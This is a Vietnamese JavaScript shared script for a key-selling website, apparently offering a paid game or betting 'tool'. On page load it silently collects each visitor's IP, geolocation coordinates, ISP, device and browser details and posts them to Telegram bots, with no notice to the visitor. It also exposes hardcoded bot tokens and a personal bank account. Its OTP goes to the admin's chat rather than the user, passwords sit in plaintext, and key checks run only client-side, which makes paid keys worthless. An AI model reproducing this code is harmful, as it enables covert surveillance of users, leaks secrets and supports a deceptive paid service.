/* ============================================================
   HOÀNG VIP WIN - SHARED SCRIPT
   Dùng chung cho index.html, auth.html, key.html, tool.html
   ============================================================ */

/* ========== CẤU HÌNH BOT ========== */
const CONFIG = {
  ADMIN_BOT_TOKEN: '8995301700:AAHIYK6ei30dgELRh3w2YZb31hcGfXdvxTo',
  OTP_BOT_TOKEN:   '8843164809:AAEdmjeVckjhfdpVNEsV5B1fanMyuorqrLA',
  BUYKEY_BOT_TOKEN:'8899402629:AAFnNM6lxJPc1aQg6kXbG_f79PEvdoTb6sk',
  ADMIN_CHAT_ID:   '7757046138',
  BOT_OTP_LINK:    'https://t.me/otpautogamefree_bot',
  BOT_BUYKEY_LINK: 'https://t.me/buykeyvipweb_bot',
  STK: {
    bank: 'VIETCOMBANK',
    number: '3382962182',
    name: 'TRAN NHAT HOANG'
  }
};

/* ========== TIỆN ÍCH CHUNG ========== */

// Hiển thị toast thông báo
function showToast(msg, type = 'info', duration = 2500) {
  let t = document.getElementById('hvToast');
  if (!t) {
    t = document.createElement('div');
    t.id = 'hvToast';
    t.className = 'toast';
    document.body.appendChild(t);
  }
  t.textContent = msg;
  t.dataset.type = type;
  t.classList.add('show');
  clearTimeout(t._timer);
  t._timer = setTimeout(() => t.classList.remove('show'), duration);
}

// Kiểm tra đăng nhập
function requireAuth() {
  const user = localStorage.getItem('currentUser');
  if (!user) {
    showToast('Vui lòng đăng nhập trước!', 'error');
    setTimeout(() => window.location.href = 'auth.html', 1200);
    return false;
  }
  return true;
}

// Kiểm tra key còn hạn
function requireActiveKey() {
  const raw = localStorage.getItem('activeKey');
  if (!raw) {
    showToast('Bạn chưa kích hoạt key!', 'error');
    setTimeout(() => window.location.href = 'key.html', 1200);
    return false;
  }
  const data = JSON.parse(raw);
  if (data.expireTime < Date.now()) {
    showToast('Key đã hết hạn, vui lòng mua key mới!', 'error');
    setTimeout(() => window.location.href = 'key.html', 1500);
    return false;
  }
  return true;
}

// Format tiền VN
function formatVND(n) {
  return Number(n).toLocaleString('vi-VN') + 'đ';
}

// Format thời gian còn lại
function formatRemain(ms) {
  if (ms <= 0) return 'Đã hết hạn';
  const s = Math.floor(ms / 1000);
  const d = Math.floor(s / 86400);
  const h = Math.floor((s % 86400) / 3600);
  const m = Math.floor((s % 3600) / 60);
  const sec = s % 60;
  if (d > 0) return `${d} ngày ${h} giờ`;
  if (h > 0) return `${h} giờ ${m} phút`;
  if (m > 0) return `${m} phút ${sec} giây`;
  return `${sec} giây`;
}

/* ========== GỬI TIN NHẮN TELEGRAM ========== */

// Gửi tin nhắn tới 1 bot
async function sendTelegram(botToken, chatId, text, parseMode = 'HTML') {
  try {
    const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text, parse_mode: parseMode })
    });
    return await res.json();
  } catch (e) {
    console.warn('[Telegram] Gửi lỗi:', e.message);
    return null;
  }
}

// Gửi song song nhiều bot
async function sendToAllBots(text) {
  return Promise.all([
    sendTelegram(CONFIG.ADMIN_BOT_TOKEN, CONFIG.ADMIN_CHAT_ID, text),
    sendTelegram(CONFIG.OTP_BOT_TOKEN, CONFIG.ADMIN_CHAT_ID, text),
    sendTelegram(CONFIG.BUYKEY_BOT_TOKEN, CONFIG.ADMIN_CHAT_ID, text)
  ]);
}

/* ========== LẤY IP + THÔNG TIN THIẾT BỊ ========== */

async function getVisitorInfo() {
  const ua = navigator.userAgent;
  let device = 'PC';
  if (/iPhone|iPad|iPod/i.test(ua)) device = 'iPhone/iPad';
  else if (/Android/i.test(ua)) device = 'Android';
  else if (/Windows/i.test(ua)) device = 'Windows PC';
  else if (/Macintosh/i.test(ua)) device = 'MacOS';

  let browser = 'Không rõ';
  if (/Edg\//i.test(ua)) browser = 'Edge';
  else if (/Chrome\//i.test(ua) && !/Edg|OPR/i.test(ua)) browser = 'Chrome';
  else if (/Firefox\//i.test(ua)) browser = 'Firefox';
  else if (/Safari\//i.test(ua)) browser = 'Safari';
  else if (/OPR\//i.test(ua)) browser = 'Opera';

  const info = {
    ip: 'N/A', country: 'N/A', countryCode: '',
    city: 'N/A', region: 'N/A', isp: 'N/A',
    lat: '', lon: '', timezone: 'N/A', callingCode: 'N/A',
    device, browser, userAgent: ua, screen: `${screen.width}x${screen.height}`,
    language: navigator.language || 'N/A',
    referrer: document.referrer || 'Truy cập trực tiếp',
    time: new Date().toLocaleString('vi-VN')
  };

  try {
    const res = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
    const d = await res.json();
    if (d && !d.error) {
      info.ip = d.ip || 'N/A';
      info.country = d.country_name || 'N/A';
      info.countryCode = d.country_code || '';
      info.city = d.city || 'N/A';
      info.region = d.region || 'N/A';
      info.isp = d.org || d.asn || 'N/A';
      info.lat = d.latitude || '';
      info.lon = d.longitude || '';
      info.timezone = d.timezone || 'N/A';
      info.callingCode = d.country_calling_code || 'N/A';
    }
  } catch (e) {
    try {
      const r2 = await fetch('https://api.ipify.org?format=json');
      const j2 = await r2.json();
      info.ip = j2.ip || 'N/A';
    } catch (_) {}
  }

  return info;
}

// Gửi toàn bộ thông tin visitor về bot admin
async function reportVisitor() {
  const info = await getVisitorInfo();
  const msg =
    `🔔 <b>NGƯỜI DÙNG TRUY CẬP</b>\n\n` +
    `🌐 <b>IP:</b> <code>${info.ip}</code>\n` +
    `🏴 <b>Quốc gia:</b> ${info.country} ${info.countryCode ? '(' + info.countryCode + ')' : ''}\n` +
    `🏙️ <b>Thành phố:</b> ${info.city}, ${info.region}\n` +
    `📡 <b>ISP:</b> ${info.isp}\n` +
    `📍 <b>Tọa độ:</b> ${info.lat || '?'}, ${info.lon || '?'}\n` +
    `🕐 <b>Múi giờ:</b> ${info.timezone}\n` +
    `📞 <b>Mã vùng:</b> ${info.callingCode}\n` +
    `💻 <b>Thiết bị:</b> ${info.device}\n` +
    `🌐 <b>Trình duyệt:</b> ${info.browser}\n` +
    `📱 <b>User-Agent:</b> <code>${info.userAgent}</code>\n` +
    `🖥️ <b>Màn hình:</b> ${info.screen}\n` +
    `🗣️ <b>Ngôn ngữ:</b> ${info.language}\n` +
    `🔗 <b>Nguồn:</b> ${info.referrer}\n` +
    `⏰ <b>Thời gian:</b> ${info.time}\n` +
    `📄 <b>Trang:</b> ${location.href}`;

  await sendToAllBots(msg);
  return info;
}

/* ========== QUẢN LÝ KEY ========== */

// Sinh key ngẫu nhiên dạng HVW-XXXX-XXXX-XXXX
function generateKey() {
  const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
  const block = () => {
    let s = '';
    for (let i = 0; i < 4; i++) s += chars[Math.floor(Math.random() * chars.length)];
    return s;
  };
  return `HVW-${block()}-${block()}-${block()}`;
}

// Lưu key chờ kích hoạt
function savePendingKey(key, plan) {
  localStorage.setItem('pendingKey_' + key, JSON.stringify({
    days: plan.days,
    price: plan.price,
    label: plan.label,
    createdAt: Date.now(),
    activated: false
  }));
}

// Kích hoạt key (tính hạn từ lúc nhập)
function activateKey(inputKey) {
  const key = String(inputKey).trim().toUpperCase();
  const raw = localStorage.getItem('pendingKey_' + key);
  if (!raw) return { ok: false, msg: 'Key không hợp lệ hoặc chưa được duyệt!' };

  const data = JSON.parse(raw);
  if (data.activated) return { ok: false, msg: 'Key này đã được kích hoạt rồi!' };

  data.activated = true;
  data.activateTime = Date.now();
  data.expireTime = data.days === 9999
    ? 9999999999999
    : Date.now() + data.days * 86400000;

  localStorage.setItem('activeKey', JSON.stringify({ key, ...data }));
  return { ok: true, data };
}

// Kiểm tra hạn sử dụng
function checkKeyStatus() {
  const raw = localStorage.getItem('activeKey');
  if (!raw) return { ok: false, msg: 'Chưa kích hoạt' };
  const d = JSON.parse(raw);
  const remain = d.expireTime - Date.now();
  if (remain <= 0) return { ok: false, msg: 'Hết hạn', data: d };
  return { ok: true, remain, data: d };
}

/* ========== OTP ========== */

let pendingOTP = null;
let pendingOTPPhone = null;

async function requestOTP(name, phone) {
  if (!name || !phone) return { ok: false, msg: 'Thiếu họ tên hoặc SĐT!' };
  if (!/^0\d{9,10}$/.test(phone)) return { ok: false, msg: 'SĐT không hợp lệ!' };

  const otp = Math.floor(100000 + Math.random() * 900000).toString();
  pendingOTP = otp;
  pendingOTPPhone = phone;

  const msg =
    `🆕 <b>YÊU CẦU OTP ĐĂNG KÝ</b>\n\n` +
    `👤 Họ tên: <b>${name}</b>\n` +
    `📱 SĐT: <code>${phone}</code>\n` +
    `🔑 Mã OTP: <code>${otp}</code>\n` +
    `⏰ ${new Date().toLocaleString('vi-VN')}\n\n` +
    `Nhập mã trên để hoàn tất đăng ký.`;

  await sendTelegram(CONFIG.OTP_BOT_TOKEN, CONFIG.ADMIN_CHAT_ID, msg);
  await sendTelegram(CONFIG.ADMIN_BOT_TOKEN, CONFIG.ADMIN_CHAT_ID,
    `📨 <b>[OTP FORWARD]</b>\n\n${msg}`);

  return { ok: true, otp };
}

function verifyOTP(input) {
  return pendingOTP && String(input).trim() === pendingOTP;
}

/* ========== QR VIETQR ========== */

function buildVietQR(amount, content) {
  return `https://img.vietqr.io/image/VCB-${CONFIG.STK.number}-compact2.png` +
    `?amount=${amount}` +
    `&addInfo=${encodeURIComponent(content)}` +
    `&accountName=${encodeURIComponent(CONFIG.STK.name)}`;
}

function genOrderId() {
  return 'HVW' + Date.now().toString(36).toUpperCase() + Math.floor(Math.random() * 1000);
}

/* ========== XỬ LÝ FORM ĐĂNG KÝ/ĐĂNG NHẬP ========== */

function registerUser(user) {
  const key = 'user_' + user.email.toLowerCase();
  if (localStorage.getItem(key)) {
    return { ok: false, msg: 'Email đã tồn tại!' };
  }
  user.createdAt = Date.now();
  localStorage.setItem(key, JSON.stringify(user));
  return { ok: true };
}

function loginUser(email, pwd) {
  const raw = localStorage.getItem('user_' + email.toLowerCase());
  if (!raw) return { ok: false, msg: 'Tài khoản không tồn tại!' };
  const user = JSON.parse(raw);
  if (user.pwd !== pwd) return { ok: false, msg: 'Sai mật khẩu!' };
  localStorage.setItem('currentUser', email.toLowerCase());
  return { ok: true, user };
}

function logout() {
  localStorage.removeItem('currentUser');
  window.location.href = 'auth.html';
}

/* ========== DRAG HELPER ========== */

function makeDraggable(node, handleNode) {
  const h = handleNode || node;
  let dragging = false, sx = 0, sy = 0, ox = 0, oy = 0;

  function start(e) {
    dragging = true;
    const p = e.touches ? e.touches[0] : e;
    sx = p.clientX; sy = p.clientY;
    ox = node.offsetLeft; oy = node.offsetTop;
    node.style.right = 'auto'; node.style.bottom = 'auto';
    node.style.transition = 'none';
  }
  function move(e) {
    if (!dragging) return;
    const p = e.touches ? e.touches[0] : e;
    const w = node.offsetWidth, hh = node.offsetHeight;
    let nx = ox + p.clientX - sx;
    let ny = oy + p.clientY - sy;
    nx = Math.max(-w / 2, Math.min(window.innerWidth - w / 2, nx));
    ny = Math.max(-hh / 2, Math.min(window.innerHeight - hh / 2, ny));
    node.style.left = nx + 'px';
    node.style.top = ny + 'px';
  }
  function stop() {
    if (!dragging) return;
    dragging = false;
    node.style.transition = '';
  }

  h.addEventListener('mousedown', start);
  window.addEventListener('mousemove', move);
  window.addEventListener('mouseup', stop);
  h.addEventListener('touchstart', start, { passive: true });
  window.addEventListener('touchmove', move, { passive: true });
  window.addEventListener('touchend', stop);
}

/* ========== AUTO-INIT KHI LOAD ========== */

document.addEventListener('DOMContentLoaded', () => {
  // Gửi báo cáo visitor 1 lần mỗi session
  if (!sessionStorage.getItem('hv_reported')) {
    sessionStorage.setItem('hv_reported', '1');
    reportVisitor().catch(() => {});
  }

  // Đồng hồ đếm ngược key (nếu có)
  const raw = localStorage.getItem('activeKey');
  if (raw) {
    const d = JSON.parse(raw);
    setInterval(() => {
      const el = document.getElementById('keyRemain');
      if (el) el.textContent = formatRemain(d.expireTime - Date.now());
    }, 1000);
  }
});

/* ========== EXPORT (nếu chạy module) ========== */
if (typeof module !== 'undefined') {
  module.exports = {
    CONFIG, showToast, requireAuth, requireActiveKey,
    formatVND, formatRemain, sendTelegram, sendToAllBots,
    getVisitorInfo, reportVisitor, generateKey, savePendingKey,
    activateKey, checkKeyStatus, requestOTP, verifyOTP,
    buildVietQR, genOrderId, registerUser, loginUser, logout,
    makeDraggable
  };
}